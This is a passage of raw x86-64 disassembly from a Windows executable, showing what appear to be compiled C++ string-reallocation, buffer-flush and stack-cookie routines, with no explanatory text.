   140007ff2:	48 83 ec 60          	sub    $0x60,%rsp
   140007ff6:	48 8b 05 43 a0 00 00 	mov    0xa043(%rip),%rax        # 0x140012040
   140007ffd:	48 33 c4             	xor    %rsp,%rax
   140008000:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140008005:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000800a:	48 8b d9             	mov    %rcx,%rbx
   14000800d:	0f 84 b0 00 00 00    	je     0x1400080c3
   140008013:	80 79 71 00          	cmpb   $0x0,0x71(%rcx)
   140008017:	0f 84 a6 00 00 00    	je     0x1400080c3
   14000801d:	48 8b 01             	mov    (%rcx),%rax
   140008020:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140008025:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   14000802a:	ff 50 18             	call   *0x18(%rax)
   14000802d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140008030:	0f 84 89 00 00 00    	je     0x1400080bf
   140008036:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000803a:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000803f:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140008043:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008048:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000804d:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140008052:	ff 15 80 30 00 00    	call   *0x3080(%rip)        # 0x14000b0d8
   140008058:	85 c0                	test   %eax,%eax
   14000805a:	74 28                	je     0x140008084
   14000805c:	83 e8 01             	sub    $0x1,%eax
   14000805f:	74 27                	je     0x140008088
   140008061:	83 f8 02             	cmp    $0x2,%eax
   140008064:	75 59                	jne    0x1400080bf
   140008066:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   14000806a:	b0 01                	mov    $0x1,%al
   14000806c:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140008071:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140008076:	48 33 cc             	xor    %rsp,%rcx
   140008079:	e8 82 07 00 00       	call   0x140008800
   14000807e:	48 83 c4 60          	add    $0x60,%rsp
   140008082:	5b                   	pop    %rbx
   140008083:	c3                   	ret
   140008084:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140008088:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000808d:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140008092:	48 2b f8             	sub    %rax,%rdi
   140008095:	74 1f                	je     0x1400080b6
   140008097:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   14000809e:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400080a3:	4c 8b c7             	mov    %rdi,%r8
   1400080a6:	ba 01 00 00 00       	mov    $0x1,%edx
   1400080ab:	ff 15 ef 32 00 00    	call   *0x32ef(%rip)        # 0x14000b3a0
   1400080b1:	48 3b f8             	cmp    %rax,%rdi
   1400080b4:	75 09                	jne    0x1400080bf
   1400080b6:	80 7b 71 00          	cmpb   $0x0,0x71(%rbx)
   1400080ba:	0f 94 c0             	sete   %al
   1400080bd:	eb ad                	jmp    0x14000806c
   1400080bf:	32 c0                	xor    %al,%al
   1400080c1:	eb a9                	jmp    0x14000806c
   1400080c3:	b0 01                	mov    $0x1,%al
   1400080c5:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400080ca:	48 33 cc             	xor    %rsp,%rcx
   1400080cd:	e8 2e 07 00 00       	call   0x140008800
   1400080d2:	48 83 c4 60          	add    $0x60,%rsp
   1400080d6:	5b                   	pop    %rbx
   1400080d7:	c3                   	ret
   1400080d8:	cc                   	int3
   1400080d9:	cc                   	int3
   1400080da:	cc                   	int3
   1400080db:	cc                   	int3
   1400080dc:	cc                   	int3
   1400080dd:	cc                   	int3
   1400080de:	cc                   	int3
   1400080df:	cc                   	int3
   1400080e0:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400080e5:	57                   	push   %rdi
   1400080e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400080ea:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400080f1:	00 
   1400080f2:	48 8b f9             	mov    %rcx,%rdi
   1400080f5:	74 5e                	je     0x140008155
   1400080f7:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   1400080fb:	48 8d 41 70          	lea    0x70(%rcx),%rax
   1400080ff:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140008104:	49 39 00             	cmp    %rax,(%r8)
   140008107:	75 20                	jne    0x140008129
   140008109:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   140008110:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140008117:	49 89 08             	mov    %rcx,(%r8)
   14000811a:	2b d1                	sub    %ecx,%edx
   14000811c:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140008120:	48 89 08             	mov    %rcx,(%rax)
   140008123:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140008127:	89 10                	mov    %edx,(%rax)
   140008129:	48 8b cf             	mov    %rdi,%rcx
   14000812c:	e8 bf fe ff ff       	call   0x140007ff0
   140008131:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140008138:	33 db                	xor    %ebx,%ebx
   14000813a:	84 c0                	test   %al,%al
   14000813c:	48 0f 45 df          	cmovne %rdi,%rbx
   140008140:	ff 15 7a 32 00 00    	call   *0x327a(%rip)        # 0x14000b3c0
   140008146:	33 f6                	xor    %esi,%esi
   140008148:	85 c0                	test   %eax,%eax
   14000814a:	48 0f 44 f3          	cmove  %rbx,%rsi
   14000814e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140008153:	eb 02                	jmp    0x140008157
   140008155:	33 f6                	xor    %esi,%esi
   140008157:	48 8b cf             	mov    %rdi,%rcx
   14000815a:	c6 47 7c 00          	movb   $0x0,0x7c(%rdi)
   14000815e:	c6 47 71 00          	movb   $0x0,0x71(%rdi)
   140008162:	ff 15 b8 2f 00 00    	call   *0x2fb8(%rip)        # 0x14000b120
   140008168:	48 8b 0d 89 84 01 00 	mov    0x18489(%rip),%rcx        # 0x1400205f8
   14000816f:	48 8b c6             	mov    %rsi,%rax
   140008172:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008177:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   14000817b:	48 c7 87 80 00 00 00 	movq   $0x0,0x80(%rdi)
   140008182:	00 00 00 00 
   140008186:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   14000818d:	00 
   14000818e:	48 83 c4 20          	add    $0x20,%rsp
   140008192:	5f                   	pop    %rdi
   140008193:	c3                   	ret
   140008194:	cc                   	int3
   140008195:	cc                   	int3
   140008196:	cc                   	int3
   140008197:	cc                   	int3
   140008198:	cc                   	int3
   140008199:	cc                   	int3
   14000819a:	cc                   	int3
   14000819b:	cc                   	int3
   14000819c:	cc                   	int3
   14000819d:	cc                   	int3
   14000819e:	cc                   	int3
   14000819f:	cc                   	int3
   1400081a0:	40 53                	rex push %rbx
   1400081a2:	55                   	push   %rbp
   1400081a3:	56                   	push   %rsi
   1400081a4:	41 57                	push   %r15
   1400081a6:	48 83 ec 38          	sub    $0x38,%rsp
   1400081aa:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   1400081ae:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400081b5:	ff ff 7f 
   1400081b8:	48 8b c3             	mov    %rbx,%rax
   1400081bb:	45 0f b6 f9          	movzbl %r9b,%r15d
   1400081bf:	48 2b c5             	sub    %rbp,%rax
   1400081c2:	48 8b f1             	mov    %rcx,%rsi
   1400081c5:	48 83 f8 01          	cmp    $0x1,%rax
   1400081c9:	0f 82 39 01 00 00    	jb     0x140008308
   1400081cf:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   1400081d4:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   1400081d9:	4c 8d 65 01          	lea    0x1(%rbp),%r12
   1400081dd:	49 8b d4             	mov    %r12,%rdx
   1400081e0:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400081e5:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400081e9:	48 83 ca 0f          	or     $0xf,%rdx
   1400081ed:	48 3b d3             	cmp    %rbx,%rdx
   1400081f0:	77 44                	ja     0x140008236
   1400081f2:	49 8b ce             	mov    %r14,%rcx
   1400081f5:	48 8b c3             	mov    %rbx,%rax
   1400081f8:	48 d1 e9             	shr    $1,%rcx
   1400081fb:	48 2b c1             	sub    %rcx,%rax
   1400081fe:	4c 3b f0             	cmp    %rax,%r14
   140008201:	77 33                	ja     0x140008236
   140008203:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140008207:	48 8b da             	mov    %rdx,%rbx
   14000820a:	48 3b d0             	cmp    %rax,%rdx
   14000820d:	48 0f 42 d8          	cmovb  %rax,%rbx
   140008211:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140008215:	48 85 c9             	test   %rcx,%rcx
   140008218:	75 04                	jne    0x14000821e
   14000821a:	33 ff                	xor    %edi,%edi
   14000821c:	eb 49                	jmp    0x140008267
   14000821e:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140008225:	72 38                	jb     0x14000825f
   140008227:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000822b:	48 3b c1             	cmp    %rcx,%rax
   14000822e:	0f 86 da 00 00 00    	jbe    0x14000830e
   140008234:	eb 0e                	jmp    0x140008244
   140008236:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000823d:	00 00 80 
   140008240:	48 83 c0 27          	add    $0x27,%rax
   140008244:	48 8b c8             	mov    %rax,%rcx
   140008247:	e8 d4 05 00 00       	call   0x140008820
   14000824c:	48 85 c0             	test   %rax,%rax
   14000824f:	74 6d                	je     0x1400082be
   140008251:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140008255:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140008259:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000825d:	eb 08                	jmp    0x140008267
   14000825f:	e8 bc 05 00 00       	call   0x140008820
   140008264:	48 8b f8             	mov    %rax,%rdi
   140008267:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   14000826b:	4c 8b c5             	mov    %rbp,%r8
   14000826e:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140008272:	48 8b cf             	mov    %rdi,%rcx
   140008275:	49 83 fe 0f          	cmp    $0xf,%r14
   140008279:	76 5d                	jbe    0x1400082d8
   14000827b:	48 8b 1e             	mov    (%rsi),%rbx
   14000827e:	48 8b d3             	mov    %rbx,%rdx
   140008281:	e8 05 15 00 00       	call   0x14000978b
   140008286:	49 8d 56 01          	lea    0x1(%r14),%rdx
   14000828a:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   14000828e:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   140008293:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000829a:	72 18                	jb     0x1400082b4
   14000829c:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400082a0:	48 83 c2 27          	add    $0x27,%rdx
   1400082a4:	48 2b d8             	sub    %rax,%rbx
   1400082a7:	48 83 eb 08          	sub    $0x8,%rbx
   1400082ab:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400082af:	77 0d                	ja     0x1400082be
   1400082b1:	48 8b d8             	mov    %rax,%rbx
   1400082b4:	48 8b cb             	mov    %rbx,%rcx
   1400082b7:	e8 e0 07 00 00       	call   0x140008a9c
   1400082bc:	eb 2b                	jmp    0x1400082e9
   1400082be:	45 33 c9             	xor    %r9d,%r9d
   1400082c1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400082c8:	00 00 
   1400082ca:	45 33 c0             	xor    %r8d,%r8d
   1400082cd:	33 d2                	xor    %edx,%edx
   1400082cf:	33 c9                	xor    %ecx,%ecx
   1400082d1:	ff 15 79 30 00 00    	call   *0x3079(%rip)        # 0x14000b350
   1400082d7:	cc                   	int3
   1400082d8:	48 8b d6             	mov    %rsi,%rdx
   1400082db:	e8 ab 14 00 00       	call   0x14000978b
   1400082e0:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   1400082e4:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   1400082e9:	48 89 3e             	mov    %rdi,(%rsi)
   1400082ec:	48 8b c6             	mov    %rsi,%rax
   1400082ef:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1400082f4:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400082f9:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   1400082fe:	48 83 c4 38          	add    $0x38,%rsp
   140008302:	41 5f                	pop    %r15
   140008304:	5e                   	pop    %rsi
   140008305:	5d                   	pop    %rbp
   140008306:	5b                   	pop    %rbx
   140008307:	c3                   	ret
   140008308:	e8 d3 93 ff ff       	call   0x1400016e0
   14000830d:	cc                   	int3
   14000830e:	e8 2d 93 ff ff       	call   0x140001640
   140008313:	cc                   	int3
   140008314:	cc                   	int3
   140008315:	cc                   	int3
   140008316:	cc                   	int3
   140008317:	cc                   	int3
   140008318:	cc                   	int3
   140008319:	cc                   	int3
   14000831a:	cc                   	int3
   14000831b:	cc                   	int3
   14000831c:	cc                   	int3
   14000831d:	cc                   	int3
   14000831e:	cc                   	int3
   14000831f:	cc                   	int3
   140008320:	40 53                	rex push %rbx
   140008322:	55                   	push   %rbp
   140008323:	56                   	push   %rsi
   140008324:	48 83 ec 40          	sub    $0x40,%rsp
   140008328:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000832c:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140008333:	ff ff 7f 
   140008336:	48 8b c3             	mov    %rbx,%rax
   140008339:	48 8b f1             	mov    %rcx,%rsi
   14000833c:	48 2b c5             	sub    %rbp,%rax
   14000833f:	48 3b c2             	cmp    %rdx,%rax
   140008342:	0f 82 6d 01 00 00    	jb     0x1400084b5
   140008348:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000834d:	4c 89 64 24 78       	mov    %r12,0x78(%rsp)
   140008352:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140008357:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   14000835b:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140008360:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   140008364:	49 8b d7             	mov    %r15,%rdx
   140008367:	48 83 ca 0f          	or     $0xf,%rdx
   14000836b:	48 3b d3             	cmp    %rbx,%rdx
   14000836e:	77 44                	ja     0x1400083b4
   140008370:	49 8b ce             	mov    %r14,%rcx
   140008373:	48 8b c3             	mov    %rbx,%rax
   140008376:	48 d1 e9             	shr    $1,%rcx
   140008379:	48 2b c1             	sub    %rcx,%rax
   14000837c:	4c 3b f0             	cmp    %rax,%r14
   14000837f:	77 33                	ja     0x1400083b4
   140008381:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140008385:	48 8b da             	mov    %rdx,%rbx
   140008388:	48 3b d0             	cmp    %rax,%rdx
   14000838b:	48 0f 42 d8          	cmovb  %rax,%rbx
   14000838f:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140008393:	48 85 c9             	test   %rcx,%rcx
   140008396:	75 04                	jne    0x14000839c
   140008398:	33 ff                	xor    %edi,%edi
   14000839a:	eb 4d                	jmp    0x1400083e9
   14000839c:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400083a3:	72 3c                	jb     0x1400083e1
   1400083a5:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400083a9:	48 3b c1             	cmp    %rcx,%rax
   1400083ac:	0f 86 09 01 00 00    	jbe    0x1400084bb
   1400083b2:	eb 0e                	jmp    0x1400083c2
   1400083b4:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1400083bb:	00 00 80 
   1400083be:	48 83 c0 27          	add    $0x27,%rax
   1400083c2:	48 8b c8             	mov    %rax,%rcx
   1400083c5:	e8 56 04 00 00       	call   0x140008820
   1400083ca:	48 85 c0             	test   %rax,%rax
   1400083cd:	0f 84 87 00 00 00    	je     0x14000845a
   1400083d3:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400083d7:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400083db:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400083df:	eb 08                	jmp    0x1400083e9
   1400083e1:	e8 3a 04 00 00       	call   0x140008820
   1400083e6:	48 8b f8             	mov    %rax,%rdi
   1400083e9:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   1400083f0:	00 
   1400083f1:	4c 8b c5             	mov    %rbp,%r8
   1400083f4:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   1400083f8:	4c 8d 3c 2f          	lea    (%rdi,%rbp,1),%r15
   1400083fc:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140008400:	48 8b cf             	mov    %rdi,%rcx
   140008403:	49 83 fe 0f          	cmp    $0xf,%r14
   140008407:	76 6b                	jbe    0x140008474
   140008409:	48 8b 1e             	mov    (%rsi),%rbx
   14000840c:	48 8b d3             	mov    %rbx,%rdx
   14000840f:	e8 77 13 00 00       	call   0x14000978b
   140008414:	4d 8b c4             	mov    %r12,%r8
   140008417:	48 8d 15 56 65 00 00 	lea    0x6556(%rip),%rdx        # 0x14000e974
   14000841e:	49 8b cf             	mov    %r15,%rcx
   140008421:	e8 65 13 00 00       	call   0x14000978b
   140008426:	49 8d 56 01          	lea    0x1(%r14),%rdx
   14000842a:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   14000842f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140008436:	72 18                	jb     0x140008450
   140008438:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   14000843c:	48 83 c2 27          	add    $0x27,%rdx
   140008440:	48 2b d8             	sub    %rax,%rbx
   140008443:	48 83 eb 08          	sub    $0x8,%rbx
   140008447:	48 83 fb 1f          	cmp    $0x1f,%rbx
   14000844b:	77 0d                	ja     0x14000845a
   14000844d:	48 8b d8             	mov    %rax,%rbx
   140008450:	48 8b cb             	mov    %rbx,%rcx
   140008453:	e8 44 06 00 00       	call   0x140008a9c
   140008458:	eb 39                	jmp    0x140008493
   14000845a:	45 33 c9             	xor    %r9d,%r9d
   14000845d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140008464:	00 00 
   140008466:	45 33 c0             	xor    %r8d,%r8d
   140008469:	33 d2                	xor    %edx,%edx
   14000846b:	33 c9                	xor    %ecx,%ecx
   14000846d:	ff 15 dd 2e 00 00    	call   *0x2edd(%rip)        # 0x14000b350
   140008473:	cc                   	int3
   140008474:	48 8b d6             	mov    %rsi,%rdx
   140008477:	e8 0f 13 00 00       	call   0x14000978b
   14000847c:	4d 8b c4             	mov    %r12,%r8
   14000847f:	48 8d 15 ee 64 00 00 	lea    0x64ee(%rip),%rdx        # 0x14000e974
   140008486:	49 8b cf             	mov    %r15,%rcx
   140008489:	e8 fd 12 00 00       	call   0x14000978b
   14000848e:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   140008493:	48 89 3e             	mov    %rdi,(%rsi)
   140008496:	48 8b c6             	mov    %rsi,%rax
   140008499:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   14000849e:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   1400084a3:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   1400084a8:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   1400084ad:	48 83 c4 40          	add    $0x40,%rsp
   1400084b1:	5e                   	pop    %rsi
   1400084b2:	5d                   	pop    %rbp
   1400084b3:	5b                   	pop    %rbx
   1400084b4:	c3                   	ret
   1400084b5:	e8 26 92 ff ff       	call   0x1400016e0
   1400084ba:	cc                   	int3
   1400084bb:	e8 80 91 ff ff       	call   0x140001640
   1400084c0:	cc                   	int3
   1400084c1:	cc                   	int3
   1400084c2:	cc                   	int3
   1400084c3:	cc                   	int3
   1400084c4:	cc                   	int3
   1400084c5:	cc                   	int3
   1400084c6:	cc                   	int3
   1400084c7:	cc                   	int3
   1400084c8:	cc                   	int3
   1400084c9:	cc                   	int3
   1400084ca:	cc                   	int3
   1400084cb:	cc                   	int3
   1400084cc:	cc                   	int3
   1400084cd:	cc                   	int3
   1400084ce:	cc                   	int3
   1400084cf:	cc                   	int3
   1400084d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400084d4:	48 8b 11             	mov    (%rcx),%rdx
   1400084d7:	48 8b 02             	mov    (%rdx),%rax
   1400084da:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400084de:	48 8b 4c 11 48       	mov    0x48(%rcx,%rdx,1),%rcx
   1400084e3:	48 85 c9             	test   %rcx,%rcx
   1400084e6:	74 07                	je     0x1400084ef
   1400084e8:	48 8b 01             	mov    (%rcx),%rax
   1400084eb:	ff 50 10             	call   *0x10(%rax)
   1400084ee:	90                   	nop
   1400084ef:	48 83 c4 28          	add    $0x28,%rsp
   1400084f3:	c3                   	ret
   1400084f4:	cc                   	int3
   1400084f5:	cc                   	int3
   1400084f6:	cc                   	int3
   1400084f7:	cc                   	int3
   1400084f8:	cc                   	int3
   1400084f9:	cc                   	int3
   1400084fa:	cc                   	int3
   1400084fb:	cc                   	int3
   1400084fc:	cc                   	int3
   1400084fd:	cc                   	int3
   1400084fe:	cc                   	int3
   1400084ff:	cc                   	int3
   140008500:	40 53                	rex push %rbx
   140008502:	55                   	push   %rbp
   140008503:	56                   	push   %rsi
   140008504:	41 54                	push   %r12
   140008506:	48 83 ec 38          	sub    $0x38,%rsp
   14000850a:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000850e:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140008515:	ff ff 7f 
   140008518:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   14000851f:	00 
   140008520:	48 8b c3             	mov    %rbx,%rax
   140008523:	48 2b c5             	sub    %rbp,%rax
   140008526:	48 8b f1             	mov    %rcx,%rsi
   140008529:	48 3b c2             	cmp    %rdx,%rax
   14000852c:	0f 82 4b 01 00 00    	jb     0x14000867d
   140008532:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140008537:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   14000853c:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140008540:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140008545:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   140008549:	49 8b d7             	mov    %r15,%rdx
   14000854c:	48 83 ca 0f          	or     $0xf,%rdx
   140008550:	48 3b d3             	cmp    %rbx,%rdx
   140008553:	77 44                	ja     0x140008599
   140008555:	49 8b ce             	mov    %r14,%rcx
   140008558:	48 8b c3             	mov    %rbx,%rax
   14000855b:	48 d1 e9             	shr    $1,%rcx
   14000855e:	48 2b c1             	sub    %rcx,%rax
   140008561:	4c 3b f0             	cmp    %rax,%r14
   140008564:	77 33                	ja     0x140008599
   140008566:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   14000856a:	48 8b da             	mov    %rdx,%rbx
   14000856d:	48 3b d0             	cmp    %rax,%rdx
   140008570:	48 0f 42 d8          	cmovb  %rax,%rbx
   140008574:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140008578:	48 85 c9             	test   %rcx,%rcx
   14000857b:	75 04                	jne    0x140008581
   14000857d:	33 ff                	xor    %edi,%edi
   14000857f:	eb 49                	jmp    0x1400085ca
   140008581:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140008588:	72 38                	jb     0x1400085c2
   14000858a:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000858e:	48 3b c1             	cmp    %rcx,%rax
   140008591:	0f 86 ec 00 00 00    	jbe    0x140008683
   140008597:	eb 0e                	jmp    0x1400085a7
   140008599:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1400085a0:	00 00 80 
   1400085a3:	48 83 c0 27          	add    $0x27,%rax
   1400085a7:	48 8b c8             	mov    %rax,%rcx
   1400085aa:	e8 71 02 00 00       	call   0x140008820
   1400085af:	48 85 c0             	test   %rax,%rax
   1400085b2:	74 7c                	je     0x140008630
   1400085b4:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400085b8:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400085bc:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400085c0:	eb 08                	jmp    0x1400085ca
   1400085c2:	e8 59 02 00 00       	call   0x140008820
   1400085c7:	48 8b f8             	mov    %rax,%rdi
   1400085ca:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
   1400085d1:	00 
   1400085d2:	49 8b d4             	mov    %r12,%rdx
   1400085d5:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   1400085d9:	48 8b cf             	mov    %rdi,%rcx
   1400085dc:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400085e0:	4e 8d 3c 07          	lea    (%rdi,%r8,1),%r15
   1400085e4:	49 83 fe 0f          	cmp    $0xf,%r14
   1400085e8:	76 60                	jbe    0x14000864a
   1400085ea:	48 8b 1e             	mov    (%rsi),%rbx
   1400085ed:	e8 99 11 00 00       	call   0x14000978b
   1400085f2:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   1400085f6:	48 8b d3             	mov    %rbx,%rdx
   1400085f9:	49 8b cf             	mov    %r15,%rcx
   1400085fc:	e8 8a 11 00 00       	call   0x14000978b
   140008601:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140008605:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000860c:	72 18                	jb     0x140008626
   14000860e:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140008612:	48 83 c2 27          	add    $0x27,%rdx
   140008616:	48 2b d8             	sub    %rax,%rbx
   140008619:	48 83 eb 08          	sub    $0x8,%rbx
   14000861d:	48 83 fb 1f          	cmp    $0x1f,%rbx
   140008621:	77 0d                	ja     0x140008630
   140008623:	48 8b d8             	mov    %rax,%rbx
   140008626:	48 8b cb             	mov    %rbx,%rcx
   140008629:	e8 6e 04 00 00       	call   0x140008a9c
   14000862e:	eb 2e                	jmp    0x14000865e
   140008630:	45 33 c9             	xor    %r9d,%r9d
   140008633:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000863a:	00 00 
   14000863c:	45 33 c0             	xor    %r8d,%r8d
   14000863f:	33 d2                	xor    %edx,%edx
   140008641:	33 c9                	xor    %ecx,%ecx
   140008643:	ff 15 07 2d 00 00    	call   *0x2d07(%rip)        # 0x14000b350
   140008649:	cc                   	int3
   14000864a:	e8 3c 11 00 00       	call   0x14000978b
   14000864f:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   140008653:	48 8b d6             	mov    %rsi,%rdx
   140008656:	49 8b cf             	mov    %r15,%rcx
   140008659:	e8 2d 11 00 00       	call   0x14000978b
   14000865e:	48 89 3e             	mov    %rdi,(%rsi)
   140008661:	48 8b c6             	mov    %rsi,%rax
   140008664:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   140008669:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000866e:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140008673:	48 83 c4 38          	add    $0x38,%rsp
   140008677:	41 5c                	pop    %r12
   140008679:	5e                   	pop    %rsi
   14000867a:	5d                   	pop    %rbp
   14000867b:	5b                   	pop    %rbx
   14000867c:	c3                   	ret
   14000867d:	e8 5e 90 ff ff       	call   0x1400016e0
   140008682:	cc                   	int3
   140008683:	e8 b8 8f ff ff       	call   0x140001640
   140008688:	cc                   	int3
   140008689:	cc                   	int3
   14000868a:	cc                   	int3
   14000868b:	cc                   	int3
   14000868c:	cc                   	int3
   14000868d:	cc                   	int3
   14000868e:	cc                   	int3
   14000868f:	cc                   	int3
   140008690:	40 53                	rex push %rbx
   140008692:	55                   	push   %rbp
   140008693:	56                   	push   %rsi
   140008694:	41 57                	push   %r15
   140008696:	48 83 ec 38          	sub    $0x38,%rsp
   14000869a:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400086a1:	ff ff 7f 
   1400086a4:	4d 8b f9             	mov    %r9,%r15
   1400086a7:	48 8b ea             	mov    %rdx,%rbp
   1400086aa:	48 8b f1             	mov    %rcx,%rsi
   1400086ad:	48 3b d3             	cmp    %rbx,%rdx
   1400086b0:	0f 87 10 01 00 00    	ja     0x1400087c6
   1400086b6:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400086bb:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400086c0:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400086c4:	48 8b ca             	mov    %rdx,%rcx
   1400086c7:	48 83 c9 0f          	or     $0xf,%rcx
   1400086cb:	48 3b cb             	cmp    %rbx,%rcx
   1400086ce:	77 44                	ja     0x140008714
   1400086d0:	49 8b d6             	mov    %r14,%rdx
   1400086d3:	48 8b c3             	mov    %rbx,%rax
   1400086d6:	48 d1 ea             	shr    $1,%rdx
   1400086d9:	48 2b c2             	sub    %rdx,%rax
   1400086dc:	4c 3b f0             	cmp    %rax,%r14
   1400086df:	77 33                	ja     0x140008714
   1400086e1:	49 8d 04 16          	lea    (%r14,%rdx,1),%rax
